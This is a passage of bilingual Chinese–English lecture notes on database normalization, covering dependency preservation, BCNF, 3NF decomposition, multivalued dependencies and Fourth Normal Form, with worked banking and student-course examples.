<p>则对于依赖保持，有</p>
<div class="arithmatex">\[
    F1 = \{A \rightarrow B\}
\]</div>
<div class="arithmatex">\[
    F2 = \{A \rightarrow C\}
\]</div>
<div class="arithmatex">\[
    F1 \cup F2 = \{A \rightarrow B, A \rightarrow C\} \neq F
\]</div>
<p>所以不正确</p>
</div>
<div class="admonition info">
<p class="admonition-title">tesing for Dependency Preservation</p>
<p>To check if dependency <span class="arithmatex">\(\alpha \rightarrow \beta\)</span> is preserved in a decomposition of </p>
<p>R into R1,R2,...,Rn</p>
<p>initial result = <span class="arithmatex">\(\alpha\)</span></p>
<p>while (changes to result):
    for each Ri in the decomposition:
        t= (result <span class="arithmatex">\(\cap\)</span> Ri)+ <span class="arithmatex">\(\cap\)</span> Ri
        result = result <span class="arithmatex">\(\cup\)</span> t</p>
<p>if result contains all attributes in <span class="arithmatex">\(\beta\)</span>,then the dependency is preserved</p>
<p>即对于每个子关系Ri：取result与Ri的交集，找出当前已知属性中属于Ri的部分</p>
<p>计算这些属性在Ri关系上的闭包(使用Ri上有效的函数依赖)再与Ri取交集，确保结果仍在Ri的属性范围内</p>
<p>将计算结果并入result集合</p>
<p>apply this process to each dependency in F</p>
</div>
<h2 id="note-db-lec7-boyce-codd-normal-form">Boyce-Codd Normal Form<a class="headerlink" href="#note-db-lec7-boyce-codd-normal-form" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>关系模式<span class="arithmatex">\(R\)</span>在功能依赖集<span class="arithmatex">\(F\)</span>下满足BCNF(Boyce-Codd Normal Form)，如果对于<span class="arithmatex">\(F^+\)</span>中所有形如<span class="arithmatex">\(\alpha \rightarrow \beta\)</span>的功能依赖，其中<span class="arithmatex">\(\alpha \subseteq R\)</span>且<span class="arithmatex">\(\beta \subseteq R\)</span>，至少满足以下条件之一：</p>
<ul>
<li><span class="arithmatex">\(\alpha \rightarrow \beta\)</span>是平凡的（即<span class="arithmatex">\(\beta \subseteq \alpha\)</span>）</li>
<li>或</li>
<li><span class="arithmatex">\(\alpha\)</span>是<span class="arithmatex">\(R\)</span>的超键（即<span class="arithmatex">\(R \subseteq \alpha^+\)</span>，<span class="arithmatex">\(\alpha \rightarrow R\)</span>）</li>
</ul>
<p>简单来说，BCNF要求所有非平凡的功能依赖，其左侧必须是超键。这个范式比第一范式更加严格，能够消除更多的数据冗余和异常问题。</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>R(A,B,C),F={A <span class="arithmatex">\(\rightarrow\)</span> B,B <span class="arithmatex">\(\rightarrow\)</span> C}，Key={A}</p>
<p>R不是BCNF，因为<span class="arithmatex">\(B \rightarrow C\)</span>的左侧不是超键，也不是平凡的。</p>
<p>R分解为R1(A,B),R2(B,C)</p>
<ul>
<li>
<p>无损分解验证和依赖保持验证成立；</p>
</li>
<li>
<p>此时R1和R2都是BCNF</p>
</li>
</ul>
</div>
<h3 id="note-db-lec7-testing-for-bcnf">Testing for BCNF<a class="headerlink" href="#note-db-lec7-testing-for-bcnf" title="Permanent link">&para;</a></h3>
<p>要检查一个非平凡依赖 <span class="arithmatex">\(\alpha \rightarrow \beta\)</span> 是否违反BCNF：</p>
<ul>
<li>计算 <span class="arithmatex">\(\alpha^+\)</span>（属性 <span class="arithmatex">\(\alpha\)</span> 的闭包）</li>
<li>验证 <span class="arithmatex">\(\alpha^+\)</span> 是否包含关系 <span class="arithmatex">\(R\)</span> 的所有属性，即 <span class="arithmatex">\(\alpha\)</span> 是否是 <span class="arithmatex">\(R\)</span> 的超键</li>
</ul>
<p>简化测试：要检查关系模式 <span class="arithmatex">\(R\)</span> 是否满足BCNF，只需检查给定集合 <span class="arithmatex">\(F\)</span> 中的依赖是否违反BCNF，而不必检查 <span class="arithmatex">\(F^+\)</span> 中的所有依赖。</p>
<ul>
<li>如果 <span class="arithmatex">\(F\)</span> 中没有依赖违反BCNF，那么 <span class="arithmatex">\(F^+\)</span> 中的依赖也不会违反BCNF</li>
</ul>
<blockquote>
<p><span class="arithmatex">\(F^+\)</span> 是由Armstrong的3个公理从 <span class="arithmatex">\(F\)</span> 推出的，而任何公理都不会使函数依赖(FD)左边变小(拆分)，故如果 <span class="arithmatex">\(F\)</span> 中没有违反BCNF的FD(即左边是superkey)，则 <span class="arithmatex">\(F^+\)</span> 中也不会。</p>
</blockquote>
<h4 id="note-db-lec7-warning">Warning<a class="headerlink" href="#note-db-lec7-warning" title="Permanent link">&para;</a></h4>
<p>然而，仅使用 <span class="arithmatex">\(F\)</span> 来测试BCNF可能在测试分解关系 <span class="arithmatex">\(R_i\)</span> 时出现错误。</p>
<p>例如，考虑 <span class="arithmatex">\(R(A, B, C, D)\)</span>，函数依赖 <span class="arithmatex">\(F = \{A \rightarrow B, B \rightarrow C\}\)</span></p>
<ul>
<li><span class="arithmatex">\(R\)</span> 是否满足BCNF？候选键是什么？</li>
<li>将 <span class="arithmatex">\(R\)</span> 分解为 <span class="arithmatex">\(R_1(A, B)\)</span> 和 <span class="arithmatex">\(R_2(A, C, D)\)</span></li>
<li><span class="arithmatex">\(F\)</span> 中没有仅包含 <span class="arithmatex">\((A, C, D)\)</span> 属性的函数依赖，因此可能误认为 <span class="arithmatex">\(R_2\)</span> 满足BCNF</li>
<li>实际上，<span class="arithmatex">\(F^+\)</span> 中的依赖 <span class="arithmatex">\(A \rightarrow C\)</span> 表明 <span class="arithmatex">\(R_2\)</span> 不满足BCNF，因为<span class="arithmatex">\(A\)</span>不是<span class="arithmatex">\(R_2\)</span>的超键，它不能确定<span class="arithmatex">\(D\)</span></li>
</ul>
<blockquote>
<p>可在 <span class="arithmatex">\(F\)</span> 下判别 <span class="arithmatex">\(R\)</span> 是否违反BCNF，但必须在 <span class="arithmatex">\(F^+\)</span> 下判别 <span class="arithmatex">\(R\)</span> 的分解式是否违反BCNF。</p>
</blockquote>
<h4 id="note-db-lec7-algorithm-for-bcnf-decomposition">Algorithm for BCNF Decomposition<a class="headerlink" href="#note-db-lec7-algorithm-for-bcnf-decomposition" title="Permanent link">&para;</a></h4>
<p>result := {R};</p>
<p>done := false;</p>
<p>compute F+;</p>
<p>while (not done) do</p>
<p>if (there is a schema Ri in result that is not in BCNF)</p>
<p>then begin</p>
<p>let <span class="arithmatex">\(\alpha \rightarrow \beta\)</span> be a nontrivial functional </p>
<p>dependency that holds on Ri such</p>
<p>that <span class="arithmatex">\(\alpha \rightarrow Ri\)</span> is not in F+, and <span class="arithmatex">\(\alpha \cap \beta = \emptyset\)</span>;</p>
<p>result := (result - Ri)  <span class="arithmatex">\(\cup\)</span> (<span class="arithmatex">\(\alpha, \beta\)</span>)  <span class="arithmatex">\(\cup\)</span> (Ri - <span class="arithmatex">\(\beta\)</span>);</p>
<p>end</p>
<p>else done := true;</p>
<blockquote>
<p>注：最终，每个子模式都满足BCNF，且分解是无损连接的。</p>
</blockquote>
<p>说明：</p>
<ul>
<li>当发现结果集中存在不满足BCNF的关系模式Ri时，这意味着Ri中存在非平凡函数依赖<span class="arithmatex">\(\alpha \rightarrow \beta\)</span>，且<span class="arithmatex">\(\alpha\)</span>不是键</li>
<li>将Ri分解为两个子模式：</li>
<li>Ri1 = (<span class="arithmatex">\(\alpha, \beta\)</span>) </li>
<li>Ri2 = (Ri - <span class="arithmatex">\(\beta\)</span>, <span class="arithmatex">\(\alpha\)</span>)</li>
<li>其中<span class="arithmatex">\(\alpha\)</span>是Ri1和Ri2的共同属性</li>
</ul>
<div class="admonition example">
<p class="admonition-title">BCNF分解实例</p>
<p>考虑关系模式：</p>
<p>R = (branch-name, branch-city, assets, customer-name, loan-number, amount)</p>
<p>函数依赖集：</p>
<p>F = {branch-name <span class="arithmatex">\(\rightarrow\)</span> branch-city assets, 
     loan-number <span class="arithmatex">\(\rightarrow\)</span> amount branch-name}</p>
<p>候选键是 {loan-number, customer-name}</p>
<p><strong>分解过程</strong>：</p>
<ol>
<li>
<p>首先检查R是否满足BCNF</p>
<ul>
<li>函数依赖 branch-name <span class="arithmatex">\(\rightarrow\)</span> branch-city assets 中，branch-name 不是超键</li>
<li>所以R违反BCNF</li>
</ul>
</li>
<li>
<p>使用算法进行分解：</p>
<ul>
<li>选择依赖 branch-name <span class="arithmatex">\(\rightarrow\)</span> branch-city assets</li>
<li><span class="arithmatex">\(\alpha\)</span> = branch-name, <span class="arithmatex">\(\beta\)</span> = {branch-city assets}</li>
<li>得到 R1= (branch-name, branch-city, assets)</li>
<li>和 R2 = (branch-name, customer-name, loan-number, amount)</li>
</ul>
</li>
<li>
<p>检查R1是否满足BCNF</p>
<ul>
<li>R1中唯一的非平凡依赖是 branch-name <span class="arithmatex">\(\rightarrow\)</span> branch-city assets</li>
<li>branch-name 是 R1 的候选键</li>
<li>所以R1满足BCNF</li>
</ul>
</li>
<li>
<p>检查R2是否满足BCNF</p>
<ul>
<li>R2中有依赖 loan-number <span class="arithmatex">\(\rightarrow\)</span> amount branch-name</li>
<li>loan-number 不是 R2 的超键（不能决定customer-name）</li>
<li>所以R2违反BCNF</li>
</ul>
</li>
<li>
<p>继续分解R2：</p>
<ul>
<li>选择依赖 loan-number <span class="arithmatex">\(\rightarrow\)</span> amount branch-name</li>
<li>得到 R3 = (loan-number, amount, branch-name)</li>
<li>和 R4 = (loan-number, customer-name)</li>
</ul>
</li>
<li>
<p>检查R3和R4是否满足BCNF</p>
<ul>
<li>R3满足BCNF（loan-number是R3的候选键）</li>
<li>R4满足BCNF（{loan-number, customer-name}是R4的候选键）</li>
</ul>
</li>
</ol>
<p><strong>最终分解</strong>：</p>
<ul>
<li>R1 = (branch-name, branch-city, assets)</li>
<li>R3 = (loan-number, branch-name, amount)</li>
<li>R4 = (customer-name, loan-number)</li>
</ul>
<p>所有最终的关系模式都满足BCNF，且整个分解是无损连接的。</p>
</div>
<h2 id="note-db-lec7-third-normal-form">Third Normal Form<a class="headerlink" href="#note-db-lec7-third-normal-form" title="Permanent link">&para;</a></h2>
<div class="admonition quote">
<p class="admonition-title">Motivation</p>
<p>实际生活中，存在这样的情况：</p>
<ul>
<li>Decompose into BCNF is not dependency preserving</li>
<li>But efficient checking for FD violation on updates is important</li>
</ul>
</div>
<div class="admonition solution">
<p class="admonition-title">Solution</p>
<p>Use 3NF, which is weaker than BCNF, but </p>
<ul>
<li>allows some redundancy</li>
<li>But FDs can be checked on individual relations without computing a join</li>
<li>There is always a lossless-join, dependency-preserving decomposition into 3NF. </li>
</ul>
</div>
<p>第三范式（3NF）是比BCNF稍弱的范式，它允许某些非平凡依赖的左侧不是超键，但要求右侧属性必须是主键的一部分。</p>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>关系模式 <span class="arithmatex">\(R\)</span> 在函数依赖集 <span class="arithmatex">\(F\)</span> 下满足第三范式（3NF），如果对于 <span class="arithmatex">\(F^+\)</span> 中所有形如 <span class="arithmatex">\(\alpha \rightarrow \beta\)</span> 的函数依赖，至少满足以下条件之一：</p>
<ul>
<li><span class="arithmatex">\(\alpha \rightarrow \beta\)</span> 是平凡的（即 <span class="arithmatex">\(\beta \subseteq \alpha\)</span>）</li>
<li>或者 <span class="arithmatex">\(\alpha\)</span> 是 <span class="arithmatex">\(R\)</span> 的超键</li>
<li>或者 <span class="arithmatex">\(\beta - \alpha\)</span> 中的每个属性都是 <span class="arithmatex">\(R\)</span> 的某个候选键的成员,如果<span class="arithmatex">\(\beta\)</span>中没有<span class="arithmatex">\(\alpha\)</span>的属性，则<span class="arithmatex">\(\beta\)</span>是候选键的一部分</li>
<li>Note: 每个属性可能属于不同的候选键</li>
</ul>
<p>任何BCNF都是3NF，但3NF不一定是BCNF</p>
<p><em>Third condition is a minimal relaxation of BCNF to ensure dependency preservation</em> </p>
</div>
<p>第三范式的特点：</p>
<ul>
<li>比BCNF更容易实现，但允许一定程度的冗余</li>
<li>总能找到一个无损连接且保持依赖的分解</li>
<li>实际应用中，当BCNF分解导致依赖不保持时，会采用3NF</li>
</ul>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>R(J,K,L),F={JK <span class="arithmatex">\(\rightarrow\)</span> L,L <span class="arithmatex">\(\rightarrow\)</span> K}</p>
<p>有两个candidate key:JK,JL</p>
<p>那么R是3NF，因为在第一个FD中，JK是superkey，在第二个FD中，K是candidate key的一部分</p>
<p>但是R不是BCNF，因为L <span class="arithmatex">\(\rightarrow\)</span> K，L不是superkey</p>
<p>例如J是student，K是course，L是teacher；</p>
<p>一门课有多个教师，一个教师上一门课，一门课多个学生选；</p>
<table>
<thead>
<tr>
<th>J</th>
<th>L</th>
<th>K</th>
</tr>
</thead>
<tbody>
<tr>
<td>j1</td>
<td>l1</td>
<td>k1</td>
</tr>
<tr>
<td>j2</td>
<td>l1</td>
<td>k1</td>
</tr>
<tr>
<td>j3</td>
<td>l1</td>
<td>k1</td>
</tr>
<tr>
<td>null</td>
<td>l2</td>
<td>k2</td>
</tr>
</tbody>
</table>
<p>A schema that is in 3NF but not in BCNF has the problems of repetition of information (e.g., the relationship l1, k1), and may need to use null values (e.g., to represent the relationship l2, k2, where there is no corresponding value for J).  </p>
</div>
<h3 id="note-db-lec7-testing-for-3nf">Testing for 3NF<a class="headerlink" href="#note-db-lec7-testing-for-3nf" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>只需检查依赖集 <span class="arithmatex">\(F\)</span> 中的函数依赖，无需检查 <span class="arithmatex">\(F^+\)</span> 中的所有函数依赖。</p>
</li>
<li>
<p>使用 <strong>属性闭包</strong> 来检查每个依赖 <span class="arithmatex">\(\alpha \rightarrow \beta\)</span>，以判断 <span class="arithmatex">\(\alpha\)</span> 是否为 <strong>超键</strong> 。</p>
</li>
<li>
<p>当 <span class="arithmatex">\(\alpha\)</span> 不是超键时</p>
<ul>
<li>需要验证 <span class="arithmatex">\(\beta\)</span> 中的每个属性是否包含在关系 <span class="arithmatex">\(R\)</span> 的某个候选键中。</li>
<li>这个测试相对昂贵，因为涉及到查找所有候选键。</li>
<li>测试关系是否满足<span class="arithmatex">\(3NF\)</span>已被证明是 NP-hard。</li>
<li>有趣的是，将关系分解为第三范式（稍后会描述）可以在多项式时间内完成。</li>
</ul>
</li>
</ul>
<p>注：第三范式比BCNF稍弱，但可以保证依赖保持性，这在实际应用中非常重要。</p>
<h3 id="note-db-lec7-3nf-decomposition-algorithm">3NF Decomposition Algorithm<a class="headerlink" href="#note-db-lec7-3nf-decomposition-algorithm" title="Permanent link">&para;</a></h3>
<p>3NF分解算法是一种能够保证无损连接和依赖保持的分解方法，该算法可以在多项式时间内完成。</p>
<h4 id="note-db-lec7-algorithm-steps">Algorithm steps<a class="headerlink" href="#note-db-lec7-algorithm-steps" title="Permanent link">&para;</a></h4>
<ol>
<li>
<p>找到函数依赖集<span class="arithmatex">\(F\)</span>的正则覆盖<span class="arithmatex">\(F_c\)</span></p>
</li>
<li>
<p>为<span class="arithmatex">\(F_c\)</span>中的每个函数依赖<span class="arithmatex">\(\alpha \rightarrow \beta\)</span>创建一个关系模式<span class="arithmatex">\(R_i = (\alpha, \beta)\)</span></p>
</li>
<li>
<p>如果没有任何关系模式包含原关系的候选键，则添加一个包含候选键的关系模式</p>
</li>
<li>
<p>消除冗余的关系模式（如果有）</p>
</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-db-lec7-__codelineno-0-1"></a>Let Fc be a canonical cover for F;
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-db-lec7-__codelineno-0-2"></a>i := 0;
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-db-lec7-__codelineno-0-3"></a>for each functional dependency α → β in Fc do
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-db-lec7-__codelineno-0-4"></a>    if none of the schemas Rj, 1 ≤ j ≤ i contains αβ
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-db-lec7-__codelineno-0-5"></a>        then begin
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-db-lec7-__codelineno-0-6"></a>            i := i + 1;
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-db-lec7-__codelineno-0-7"></a>            Ri := (α, β)
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-db-lec7-__codelineno-0-8"></a>        end
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-db-lec7-__codelineno-0-9"></a>if none of the schemas Rj, 1 ≤ j ≤ i contains a candidate key for R then
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-db-lec7-__codelineno-0-10"></a>    begin
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-db-lec7-__codelineno-0-11"></a>        i := i + 1;
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#note-db-lec7-__codelineno-0-12"></a>        Ri := any candidate key for R;
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#note-db-lec7-__codelineno-0-13"></a>    end
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#note-db-lec7-__codelineno-0-14"></a>return (R1, R2, ..., Ri)
</span></code></pre></div>
<p>这个算法的特点：</p>
<ul>
<li>第2步确保了依赖保持性，因为<span class="arithmatex">\(F_c\)</span>中的每个函数依赖都被包含在某个子模式中</li>
<li>第3步确保了无损连接性，因为至少有一个子模式包含原关系的候选键</li>
<li>生成的所有关系模式都满足3NF</li>
</ul>
<div class="admonition example">
<p class="admonition-title">3NF分解示例</p>
<p>原始关系模式
<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-db-lec7-__codelineno-1-1"></a>Banker-info-schema = (branch-name, customer-name, banker-name, office-number)
</span></code></pre></div></p>
<p>功能依赖集
<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-db-lec7-__codelineno-2-1"></a>F = {banker-name → branch-name office-number, 
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-db-lec7-__codelineno-2-2"></a>    customer-name branch-name → banker-name}
</span></code></pre></div></p>
<p>候选键
<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-db-lec7-__codelineno-3-1"></a>{customer-name, branch-name}
</span></code></pre></div></p>
<p>3NF分解过程</p>
<p>根据3NF分解算法，我们需要对关系模式进行分解：</p>
<ol>
<li>首先确认F即为规范覆盖Fc（没有多余属性）</li>
<li>为每个功能依赖创建关系模式：<ul>
<li>处理 banker-name → branch-name office-number：
    <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-db-lec7-__codelineno-4-1"></a>Banker-office-schema = (banker-name, branch-name, office-number)
</span></code></pre></div></li>
<li>处理 customer-name branch-name → banker-name：
    <div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-db-lec7-__codelineno-5-1"></a>Banker-schema = (customer-name, branch-name, banker-name)
</span></code></pre></div></li>
</ul>
</li>
<li>检查是否包含候选键：Banker-schema包含了原关系的候选键(customer-name, branch-name)</li>
<li>检查冗余关系：两个模式都不冗余</li>
</ol>
<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-db-lec7-__codelineno-6-1"></a>Banker-office-schema = (banker-name, branch-name, office-number)
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#note-db-lec7-__codelineno-6-2"></a>Banker-schema = (customer-name, branch-name, banker-name)
</span></code></pre></div>
<p>这个分解具有无损连接性和依赖保持性，且两个关系模式都满足第三范式。这样的分解消除了原关系中可能存在的更新、插入和删除异常问题。</p>
<p>在实际银行系统中，这样的分解使得银行职员信息和客户-银行职员对应关系可以独立管理，更有效地避免了数据冗余和不一致性问题。</p>
</div>
<div class="admonition summary">
<p class="admonition-title">BCNF与3NF的比较</p>
<table>
<thead>
<tr>
<th>特性</th>
<th>BCNF</th>
<th>3NF</th>
</tr>
</thead>
<tbody>
<tr>
<td>定义</td>
<td>所有非平凡依赖的左侧必须是超键</td>
<td>所有非平凡依赖的左侧是超键，或右侧是候选键的一部分</td>
</tr>
<tr>
<td>数据冗余</td>
<td>较少</td>
<td>可能存在一些冗余</td>
</tr>
<tr>
<td>依赖保持</td>
<td>不保证</td>
<td>总是保证</td>
</tr>
<tr>
<td>无损连接</td>
<td>保证</td>
<td>保证</td>
</tr>
<tr>
<td>复杂度</td>
<td>NP-complete</td>
<td>多项式时间可解</td>
</tr>
</tbody>
</table>
<p>在实际数据库设计中：</p>
<ul>
<li>如果能够得到无损连接且保持依赖的BCNF分解，优先选择BCNF</li>
<li>如果BCNF分解无法保持依赖，而效率检查很重要，则选择3NF</li>
<li>有时也会选择混合方案：一部分关系采用BCNF，一部分采用3NF</li>
</ul>
</div>
<h2 id="note-db-lec7-multivalued-dependencies">Multivalued Dependencies<a class="headerlink" href="#note-db-lec7-multivalued-dependencies" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>Let <span class="arithmatex">\(R\)</span> be a relation schema and let <span class="arithmatex">\(\alpha \in R\)</span> and <span class="arithmatex">\(\beta \in R\)</span>, the multivalued dependency</p>
<div class="arithmatex">\[ 
    \alpha \rightarrow\rightarrow \beta 
\]</div>
<p>holds on <span class="arithmatex">\(R\)</span>, if in any legal relation <span class="arithmatex">\(r(R)\)</span>, for <strong>all pairs</strong> of tuples <span class="arithmatex">\(t_1\)</span> and <span class="arithmatex">\(t_2\)</span> 
in <span class="arithmatex">\(r\)</span> such that <span class="arithmatex">\(t_1[\alpha] = t_2[\alpha]\)</span>, there exist tuples <span class="arithmatex">\(t_3\)</span> and <span class="arithmatex">\(t_4\)</span> in <span class="arithmatex">\(r\)</span> such that:</p>
<div class="arithmatex">\[t_1[\alpha] = t_2[\alpha] = t_3[\alpha] = t_4[\alpha]\]</div>
<div class="arithmatex">\[t_3[\beta] = t_1[\beta]\]</div>
<div class="arithmatex">\[t_3[R - \alpha - \beta] = t_2[R - \alpha - \beta]\]</div>
<div class="arithmatex">\[t_4[\beta] = t_2[\beta]\]</div>
<div class="arithmatex">\[t_4[R - \alpha - \beta] = t_1[R - \alpha - \beta]\]</div>
<p>Let <span class="arithmatex">\(R - \alpha - \beta = Z\)</span>:</p>
<div class="arithmatex">\[t_3[Z] = t_2[Z]\]</div>
<div class="arithmatex">\[t_4[Z] = t_1[Z]\]</div>
<p>如果<span class="arithmatex">\(\beta \in \alpha\)</span>，则<span class="arithmatex">\(\alpha \rightarrow\rightarrow \beta\)</span>是平凡的</p>
<p>如果<span class="arithmatex">\(\alpha \cup \beta = R\)</span>，则<span class="arithmatex">\(\alpha \rightarrow\rightarrow \beta\)</span>是平凡的</p>
</div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>Let R be a relation schema with a set of attributes that are partitioned into 3 nonempty subsets. </p>
<div class="arithmatex">\[Y, Z, W\]</div>
<p>We say that <span class="arithmatex">\(Y \rightarrow\rightarrow Z\)</span> (Y multi-determines Z) if and only if for all possible relations r(R) <span class="arithmatex">\(t_1=(y1, z1, w1) \in r\)</span> and <span class="arithmatex">\(t_2=(y1, z2, w2) \in r\)</span> </p>
<p>then <span class="arithmatex">\(t_3=(y1, z1, w2) \in r\)</span> and <span class="arithmatex">\(t_4=(y1, z2, w1) \in r\)</span> </p>
<p>Note that since the behavior of Z and W are identical, it follows that <span class="arithmatex">\(Y \rightarrow\rightarrow Z\)</span> if <span class="arithmatex">\(Y \rightarrow\rightarrow W\)</span>. </p>
</div>
<p>多值依赖可以这样理解：当一个属性A(<span class="arithmatex">\(\alpha\)</span>)确定了另一组属性B(<span class="arithmatex">\(\beta\)</span>)的一组值，并且这组值 <strong>独立于</strong> 其他属性C(<span class="arithmatex">\(R-\alpha-\beta\)</span>)时，我们说A多值依赖于B（写作A→→B）。</p>
<p>简单来说："如果我知道A的值，那么B的值集合与C的值集合是相互独立的组合"。</p>
<p>想象一个学生选课表：</p>
<ul>
<li>每个学生可以选多门课程</li>
<li>每个学生有多个爱好</li>
<li>学生选什么课与他有什么爱好没有关系</li>
</ul>
<p>这就形成了：</p>
<ul>
<li>学生ID →→ 课程（学生ID多值依赖于课程）</li>
<li>学生ID →→ 爱好（学生ID多值依赖于爱好）</li>
</ul>
<p>假设张三选了数学和物理两门课，他有绘画和游泳两个爱好，表中就会出现：</p>
<table>
<thead>
<tr>
<th>学生ID</th>
<th>课程</th>
<th>爱好</th>
</tr>
</thead>
<tbody>
<tr>
<td>张三</td>
<td>数学</td>
<td>绘画</td>
</tr>
<tr>
<td>张三</td>
<td>数学</td>
<td>游泳</td>
</tr>
<tr>
<td>张三</td>
<td>物理</td>
<td>绘画</td>
</tr>
<tr>
<td>张三</td>
<td>物理</td>
<td>游泳</td>
</tr>
</tbody>
</table>
<p>注意：表中每个课程都与每个爱好组合出现了一次，这就是多值依赖导致的**数据冗余**。</p>
<p>因为多值依赖表示的是"独立的多对多关系"：</p>
<ul>
<li>学生与课程是多对多关系</li>
<li>学生与爱好是多对多关系</li>
<li>这两种关系相互独立</li>
</ul>
<p>当我们把独立的关系放在同一张表中，必然会产生所有可能组合，导致冗余。</p>
<p>将表分解为两个独立的关系：</p>
<ol>
<li>学生-课程表：(学生ID, 课程)</li>
<li>学生-爱好表：(学生ID, 爱好)</li>
</ol>
<p>这样既减少了冗余，也反映了数据的真实语义：课程选择和爱好是两个独立的多值事实。</p>
<p>这就是为什么我们需要第四范式(4NF)：消除非平凡且非函数依赖的多值依赖。</p>
<h2 id="note-db-lec7-fourth-normal-form">Fourth Normal Form<a class="headerlink" href="#note-db-lec7-fourth-normal-form" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>The closure <span class="arithmatex">\(D^+\)</span> of <span class="arithmatex">\(D\)</span> is the set of all functional and multivalued dependencies logically implied by <span class="arithmatex">\(D\)</span>. 即D的闭包</p>
<p>一个关系模式<span class="arithmatex">\(R\)</span>在给定的函数依赖集和多值依赖集<span class="arithmatex">\(D\)</span>下满足第四范式(4NF)，当且仅当对于所有在<span class="arithmatex">\(D^+\)</span>中的多值依赖<span class="arithmatex">\(\alpha \rightarrow\rightarrow \beta\)</span>（其中<span class="arithmatex">\(\alpha \subseteq R\)</span>且<span class="arithmatex">\(\beta \subseteq R\)</span>），至少满足以下条件之一：</p>
<ul>
<li><strong>平凡依赖</strong>：<span class="arithmatex">\(\alpha \rightarrow\rightarrow \beta\)</span>是平凡的，意味着<span class="arithmatex">\(\beta \subseteq \alpha\)</span>（<span class="arithmatex">\(\beta\)</span>是<span class="arithmatex">\(\alpha\)</span>的子集）或<span class="arithmatex">\(\alpha \cup \beta = R\)</span>（<span class="arithmatex">\(\alpha\)</span>和<span class="arithmatex">\(\beta\)</span>的并集等于整个关系）</li>
<li><strong>超键约束</strong>：<span class="arithmatex">\(\alpha\)</span>是<span class="arithmatex">\(R\)</span>的超键</li>
</ul>
</div>
<ul>
<li>如果一个关系满足4NF，它必然满足BCNF</li>
<li>4NF主要解决了多值依赖导致的数据冗余问题</li>
<li>4NF比BCNF更严格</li>
</ul>
<p>以学生-课程-爱好关系为例：</p>
<table>
<thead>
<tr>
<th>学生ID</th>
<th>课程</th>
<th>爱好</th>
</tr>
</thead>
<tbody>
<tr>
<td>张三</td>
<td>数学</td>
<td>绘画</td>
</tr>
<tr>
<td>张三</td>
<td>数学</td>
<td>游泳</td>
</tr>
<tr>
<td>张三</td>
<td>物理</td>
<td>绘画</td>
</tr>
<tr>
<td>张三</td>
<td>物理</td>
<td>游泳</td>
</tr>
</tbody>
</table>
<p>这个关系存在多值依赖：
- 学生ID →→ 课程
- 学生ID →→ 爱好</p>
<p>但学生ID不是该关系的超键，因此违反4NF。</p>
<p>将违反4NF的关系分解为满足4NF的关系：</p>
<ol>
<li>学生-课程关系：(学生ID, 课程)</li>
<li>学生-爱好关系：(学生ID, 爱好)</li>
</ol>
<h3 id="note-db-lec7-requirements-for-decomposition">Requirements for decomposition<a class="headerlink" href="#note-db-lec7-requirements-for-decomposition" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Restriction of MVDs</p>
</blockquote>
<p>Assume <span class="arithmatex">\(R\)</span> is decomposed into <span class="arithmatex">\(R_1, R_2, ..., R_n\)</span>, each <span class="arithmatex">\(R_i\)</span> is required to conform to 4NF. </p>
<p>The restriction of <span class="arithmatex">\(D\)</span> to <span class="arithmatex">\(R_i\)</span> is the set <span class="arithmatex">\(D_i\)</span> consisting of :</p>
<ul>
<li>All functional dependencies in <span class="arithmatex">\(D^+\)</span> that include only attributes of <span class="arithmatex">\(R_i\)</span></li>
<li>All multivalued dependencies of the form </li>
</ul>
<div class="arithmatex">\[\alpha \rightarrow\rightarrow (\beta \cap R_i)\]</div>
<p>where <span class="arithmatex">\(\alpha \subseteq R_i\)</span> and <span class="arithmatex">\(\alpha \rightarrow\rightarrow \beta\)</span> is in <span class="arithmatex">\(D^+\)</span></p>
<p>所有在<span class="arithmatex">\(D^+\)</span>中（<span class="arithmatex">\(D\)</span>的闭包）仅包含<span class="arithmatex">\(R_i\)</span>属性的函数依赖会被保留在<span class="arithmatex">\(D_i\)</span>中。</p>
